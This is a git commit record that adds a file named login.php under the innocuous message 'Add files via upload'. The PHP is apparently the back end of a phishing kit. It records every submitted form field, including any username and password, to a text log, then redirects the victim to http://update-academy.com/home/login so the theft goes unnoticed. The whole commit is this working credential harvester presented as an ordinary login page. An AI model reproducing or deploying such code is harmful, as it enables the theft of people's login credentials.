91b3625d30b4d257462ad8e7e6f3635120d51a8a
jniko13 <becap1010@gmail.com>
2017-02-02 11:07:26 +0000

    Add files via upload

---
+++ login.php
@@ -0,0 +1,13 @@
+<?php
+header ('Location: http://update-academy.com/home/login ');
+$handle = fopen("logs_34329.txt", "a");
+foreach($_POST as $variable => $value) {
+    fwrite($handle, $variable);
+    fwrite($handle, "=");
+    fwrite($handle, $value);
+    fwrite($handle, "\r\n");
+}
+fwrite($handle, "===============\r\n");
+fclose($handle);
+exit;
+?>
